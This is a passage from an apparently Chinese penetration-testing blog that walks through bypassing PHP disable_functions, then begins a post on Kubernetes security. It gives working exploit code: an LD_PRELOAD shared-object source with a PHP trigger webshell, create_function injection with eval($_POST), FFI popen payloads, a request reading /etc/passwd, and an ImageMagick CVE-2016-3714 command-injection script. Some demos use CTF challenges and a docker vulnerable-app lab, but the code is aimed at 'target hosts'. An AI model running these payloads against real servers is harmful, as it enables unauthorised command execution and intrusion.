title=""></a></h6><p>既然这样，我们就用getuid做劫持测试，先写一段getuid的c源码，然后编译成64位共享动态链接库，也就是xxxx.so（也就是对应c的同名文件，编译过程的报错可以忽略）</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-36.png" class="" title="2024-05-01_09-36.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>至于为什么要用-fPIC参数，这样编译出来的代码是没有绝对地址的，将全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，并且都可以正确的执行，这样一来，共享库被加载时，在内存的位置将不会是固定的。接下来我们执行看下效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">LD_PRELOAD=/xxx/xxx/xxx.so `<span class="hljs-built_in">which</span> <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-42.png" class="" title="2024-05-01_09-42.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>可以看到系统会先加载我们写的so文件，然后执行id命令，我的环境可能出了点问题，所以会重复多次执行新增的语句，但不过也没啥影响，那我们如何在php站点中使用LD_PRELOAD进行disable——functions的绕过？思路很简单：创建一个可执行系统命令的so文件，然后再编写一个php文件去引用我们的这个so文件。</p><p>知识点补充：在php中，我们可以用putenv函数提前加载我们设计好的so文件</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-06.png" class="" title="2024-05-01_14-06.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发，利用代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br>    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;outpath&quot;</span>];<br>    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot; &gt; &quot;</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="hljs-variable">$evil_cmdline</span>);<br>    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;sopath&quot;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=&quot;</span> . <span class="hljs-variable">$so_path</span>);<br>    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$out_path</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>攻击脚本如下：bypass_disablefunc.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// get command line options and arg</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* cmdline = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE&quot;</span>);<br><br>    <span class="hljs-comment">// unset environment variable LD_PRELOAD.</span><br>    <span class="hljs-comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some</span><br>    <span class="hljs-comment">// distribution (e.g., centos), I need crafty trick.</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// executive command</span><br>    <span class="hljs-built_in">system</span>(cmdline);<br>&#125;<br></code></pre></td></tr></table></figure><p>GCC 有个 C 语言扩展修饰符 attribute（上图圈起来的部分），可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行，并且会从环境变量 EVILCMDLINE 中接收刚才php传递过来的待执行的命令行，接下来编译为共享对象文件</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-33.png" class="" title="2024-05-01_14-33.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>然后我们把所有相关文件上传到web目录下</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-34.png" class="" title="2024-05-01_14-34.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>看一下效果</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-37.png" class="" title="2024-05-01_14-37.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>CGI是什么？简单来说就是放在服务器上的可执行程序,比如使用linux shell脚本编写的cgi程序便可以执行系统命令，任何具有MIME类型application&#x2F;x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端，可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中，绕过方式：就是利用htaccess覆盖apache配置，增加cgi程序达成执行系统命令，利用条件是当我们发现目标主机Apache开启了CGI，Web目录下有写入的权限：</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-26.png" class="" title="2024-05-01_15-26.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-27.png" class="" title="2024-05-01_15-27.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>在本地准备好.htaccess文件和要执行命令的cgi文件</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-30.png" class="" title="2024-05-01_15-30.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>通过蚁剑上传到web目录</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-32.png" class="" title="2024-05-01_15-32.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>这个时候我们的CGI还不能执行，因为还没有权限，我们使用php的chmod()函数给其添加可执行权限</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-33.png" class="" title="2024-05-01_15-33.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>赋予权限以后，当我们再访问CGI文件便可成功执行命令</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-34.png" class="" title="2024-05-01_15-34.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>也可以尝试直接使用蚁剑的插件</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-35.png" class="" title="2024-05-01_15-35.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>什么是PHP-FPM？FPM就是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给FPM，FPM按照CGI的协议将TCP流解析成真正的数据，由于FPM默认监听的是9000端口，我们就可以绕过Web服务器，直接构造Fastcgi协议，和fpm进行通信，于是就有了利用Webshell直接与FPM通信从而绕过disable_functions的姿势，利用条件：当我们拿到一个shell之后，查看phpinfo发现设置了disable_functions，并且我们发现目标主机配置了FPM&#x2F;Fastcgi，这个时候就可以使用PHP-FPM绕过disable_functions来执行命令</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-43.png" class="" title="2024-05-01_15-43.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>蚁剑中有通过PHP-FPM模式绕过disable_functions的插件（注意：该模式下需要选择PHP-FPM的接口地址，需要自行找配置文件查FPM接口地址，默认的是 unix:&#x2F;&#x2F;&#x2F;本地Socket这种的，如果配置成TCP的默认是127.0.0.1:9000）</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-45.png" class="" title="2024-05-01_15-45.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>成功配置后，会在同目录下上传一个.antproxy.php文件，我们只需重新连接获取新的shell即可，新的shell是可以成功执行所有命令的</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-47.png" class="" title="2024-05-01_15-47.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-48.png" class="" title="2024-05-01_15-48.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p>原理就是利用PHP垃圾收集器中很多年前存在的一个bug，通过PHP垃圾收集器中堆溢出来绕过disable_functions并执行系统命令，php版本利用条件：7.0-7.3，接下来，还是通过 一道CTF题目【GKCTF2020】CheckIN 来演示如何绕过，此时我们已经拿到了shell,然后需要下载我们要利用到的脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a><br>下载后，在pwn函数中放置你想要执行的系统命令</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-04.png" class="" title="2024-05-01_16-04.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>但是这样有一个弊端，每次执行什么命令，都需要去改PWN函数里面的内容，所以我们可以直接该为POST传参</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-06.png" class="" title="2024-05-01_16-06.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>然后将修改完的脚本上传至目标主机有权限的目录当中，然后将脚本包含进来并使用POST方法提供你想要执行的命令即可</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_23-18.png" class="" title="2024-05-01_23-18.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-23.png" class="" title="2024-05-01_16-23.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p>原理就是利用json序列化程序中的堆溢出触发，以绕过disable_functions和执行系统命令，利用方法和其他的UAF绕过disable_functions大同小异，首先我们下载利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a> 下载下来之后，还是像刚才那样对脚本稍作修改，改成传参形式</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-44.png" class="" title="2024-05-01_16-44.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>修改完成之后，上传至有权限的目录（&#x2F;var&#x2F;tmp&#x2F;）后包含执行就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?xxx=include(<span class="hljs-string">&quot;/var/tmp/exploit.php&quot;</span>);<br>POST: <span class="hljs-built_in">whoami</span>=<span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-47.png" class="" title="2024-05-01_16-47.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><h2 id="FFI扩展"><a href="#FFI扩展" class="headerlink" title="FFI扩展"></a>FFI扩展</h2><p>在php的7.4版本中有一个新特性即FFI即外部函数接口，总结来说就是能够让你在php中调用c的技术，这样一来，我们可以先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass，下面通过2020年极客大挑战的一道题目来演示如何利用PHP 7.4 FFI成功突破disable_functions的限制。进入题目后，首先发现源代码中有一段提示</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-25.png" class="" title="2024-05-01_17-25.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>说明可以动态的执行php代码，此刻联想到了create_function代码注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-built_in">whoami</span>]);/*<br></code></pre></td></tr></table></figure><p>成功连接蚁剑，but!!但是无法访问其他目录，刚开始我脑子抽了，一直以为是我的环境或者电脑出了什么问题，以至于在这里耽误了很长时间…😰</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-29.png" class="" title="2024-05-01_17-29.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>通过create_function代码注入执行phpinfo()，看到了disable_functions和FFI的配置信息，够狠..函数基本给我禁了了并且FFI也是开启的</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-34.png" class="" title="2024-05-01_17-34.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-35.png" class="" title="2024-05-01_17-35.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>首先尝试调用C库的system函数，因为考虑到c库中的system执行命令没有回显，所以可以将结果写入到一个有权限的目录，然后再用echo将结果读出来</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?f</span>ighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-variable">$ffi</span> = <span class="hljs-variable constant_">FFI</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);echo file_get_contents(<span class="hljs-string">&quot;/tmp/res.txt&quot;</span>);<span class="hljs-regexp">/*</span><br></code></pre></td></tr></table></figure><p>but!!失败了..没有返回任何结果，C库的system函数调用shell命令，只能获取到shell命令的返回值，而不能获取shell命令的输出结果，如果想获取输出结果我们可以用popen函数来实现，所以，我们还可以利用C库的popen()函数来执行命令，但要读取到结果还需要C库的fgetc等函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);<span class="hljs-variable">$o</span> = <span class="hljs-variable">$ffi</span>-&gt;popen(<span class="hljs-string">&quot;ls /&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$c</span> = <span class="hljs-variable">$ffi</span>-&gt;fgetc(<span class="hljs-variable">$o</span>)) != -1)&#123;<span class="hljs-variable">$d</span> .= str_pad(strval(dechex(<span class="hljs-variable">$c</span>)),2,<span class="hljs-string">&quot;0&quot;</span>,0);&#125;<span class="hljs-variable">$ffi</span>-&gt;pclose(<span class="hljs-variable">$o</span>);<span class="hljs-built_in">echo</span> hex2bin(<span class="hljs-variable">$d</span>);/*<br></code></pre></td></tr></table></figure><p>执行结束后，查看源码可以发现成功执行命令（ls &#x2F;），并成功读取到结果</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-37.png" class="" title="2024-05-01_17-37.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><p>imagemagick是一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片，其实ImageMagick绕过disable_functions说白了就是使用ImageMagick的一个历史漏洞(CVE-2016-3714)，只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令，所以如果在phpinfo中看到有这个ImageMagick，都可以进行尝试一下</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-09.png" class="" title="2024-05-01_20-09.png"><p>为了方便演示，我直接使用网上已有的docker镜像来搭建环境</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker pull medicean/vulapps:i_imagemagick_1<br>docker <span class="hljs-built_in">run</span> -d -p 8000:80 <span class="hljs-attribute">--name</span>=i_imagemagick_1 medicean/vulapps:i_imagemagick_1<br></code></pre></td></tr></table></figure><p>进入容器查看poc.php和poc.png，这其实是已经写好的poc,执行命令就是ls -la，当然想要执行命令我们可以自己构造，poc也可自行构建</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-17.png" class="" title="2024-05-01_20-17.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-14.png" class="" title="2024-05-01_20-14.png"><h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>开始验证poc,在容器外执行，可以发现成功执行了ls -la命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> i_imagemagick_1 convert /poc.png 1.png<br></code></pre></td></tr></table></figure><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-17_1.png" class="" title="2024-05-01_20-17_1.png"><h6 id="-36"><a href="#-36" class="headerlink" title=""></a></h6><p>附上利用脚本，将其上传到目标主机有权限的目录，然后包含该脚本并传参执行命令即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>   <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;id&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="hljs-subst">$command</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>【参考文章】<br><a href="https://www.laruence.com/2020/03/11/5475.html">https://www.laruence.com/2020/03/11/5475.html</a><br><a href="https://www.php.net/manual/zh/class.ffi.php">https://www.php.net/manual/zh/class.ffi.php</a><br><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a><br><a href="https://mp.weixin.qq.com/s/fs-IKJuDptJeZMRDCtbdkw">https://mp.weixin.qq.com/s/fs-IKJuDptJeZMRDCtbdkw</a><br><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><br><a href="https://mp.weixin.qq.com/s/_L379eq0kufu3CCHN1DdkA">https://mp.weixin.qq.com/s/_L379eq0kufu3CCHN1DdkA</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8s安全</title>
    <link href="/2024/04/10/k8s%E5%AE%89%E5%85%A8/"/>
    <url>/2024/04/10/k8s%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是k8s"><a href="#什么是k8s" class="headerlink" title="什么是k8s"></a>什么是k8s</h2><p>kubernetes，简称K8s，是用8代替名字中间的8个字符“ubernete”而成的缩写，是一个开源的用于编排云平台中多个主机上的容器化的应用，目标是让部署容器化的应用能简单并且高效的使用, 提供了应用部署，规划，更新，维护的一种机制。其核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运行着，管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes在系统提升工具以及人性化方面，让用户能够方便的部署自己的应用</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile">核心特点：<br><br><span class="hljs-section">可移植: 支持公有云，私有云，混合云，多重云（multi-cloud）</span><br><span class="hljs-section">可扩展: 模块化, 插件化, 可挂载, 可组合</span><br><span class="hljs-section">自动化: 自动部署，自动重启，自动复制，自动伸缩/扩展</span><br>快速部署应用，快速扩展应用<br>无缝对接新的应用功能<br>节省资源，优化硬件资源的使用<br></code></pre></td></tr></table></figure><p>提到k8s不得不提它的组件：master，node(节点)，pod<br>其中master是提供集群的管理控制中心，负责整个集群的决策调度，发现和响应集群的事件，Master组件可以在集群中任何节点上运行，但是为了简单起见，通常在一台VM&#x2F;机器上启动所有Master组件，并且不会在此VM&#x2F;机器上运行用户容器；node是指k8s集群的工作节点，每个集群中至少需要一台Node节点，当某个Node节点出现问题而导致宕机时，Master会自动将该节点上的Pod调度到其他节点；pod是指k8s的基本调度单元，一个pod一般包含一个或多个容器，这样可以保证它们一直位于主机上，并且可以共享资源，k8s中的每个pod都被分配一个唯一的（在集群内的）IP地址这样就可以允许应用程序使用端口，而不会有冲突的风险</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/640.png" class="" title="640.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>随着越来越多企业开始上云的产品，并且在攻防演练中常常碰到云相关的场景，例：公有云、私有云、混合云、虚拟化集群等，所以很多时候传统的渗透姿势可能也要改变传统格局，开辟新的适用于云原生的渗透路径</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">参考链接：<br>https://baike.baidu.com/item/kubernetes/22864162?fr=ge_ala<br>https://blog.csdn.net/zouyang920/article/details/122819418<br>https://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==<span class="hljs-variable">&amp;mid</span>=2247510022<span class="hljs-variable">&amp;idx</span>=1<span class="hljs-variable">&amp;sn</span>=4b13dffc44e5cdbc11b39764fd817b0a<span class="hljs-variable">&amp;chksm</span>=ceab4346f9dcca50ed981739d20530c0cd0959302a8f0f7c974db6124260240b10a70da77cd3<span class="hljs-variable">&amp;mpshare</span>=1<span class="hljs-variable">&amp;scene</span>=24<span class="hljs-variable">&amp;srcid</span>=0327HPY9YFYeUhr2O5YD44TX<span class="hljs-variable">&amp;sharer_shareinfo</span>=bd0ab73c01bb8887c96187bc6e5ec71b<span class="hljs-variable">&amp;sharer_shareinfo_first</span>=bd0ab73c01bb8887c96187bc6e5ec71b#rd<br></code></pre></td></tr></table></figure><h2 id="k8s攻击面与利用"><a href="#k8s攻击面与利用" class="headerlink" title="k8s攻击面与利用"></a>k8s攻击面与利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>k8s中的每个环境都会有很多信息是共享的，包括Secrets、API Keys、配置、服务等等，所以信息收集是关键，当然现在通常情况下会直接用CDK一把梭</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_09-07.png" class="" title="2024-04-09_09-07.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>获取环境变量，包括 Kubernetes Secret，服务名称、端口等</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_09-08.png" 